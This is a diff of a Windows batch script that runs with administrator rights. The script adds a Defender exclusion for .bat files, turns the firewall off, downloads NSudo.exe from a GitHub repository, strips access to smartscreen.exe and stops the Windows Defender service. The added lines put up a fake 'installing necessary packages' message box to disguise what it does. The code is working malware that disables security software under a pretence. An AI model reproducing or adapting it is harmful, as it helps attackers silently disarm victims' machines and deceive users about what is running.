@@ -20,15 +20,17 @@ if '%errorlevel%' NEQ '0' (
     exit /B
 
 :gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
+echo msgbox "Hey! Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!" > %tmp%\tmp.vbs
+wscript %tmp%\tmp.vbs
+del %tmp%\tmp.vbs
+
+echo  Installing Necessary Packages.....Please Wait.......
 
 set xxx=%systemroot%
 
 set i-love-you-hande-ercel=System32
 
 
-icacls "%xxx%\%i-love-you-hande-ercel%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
@@ -70,6 +72,9 @@ powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 cd  %temp%
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe', '.\NSudo.exe') }
+
+
+icacls "%xxx%\%i-love-you-hande-ercel%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
 
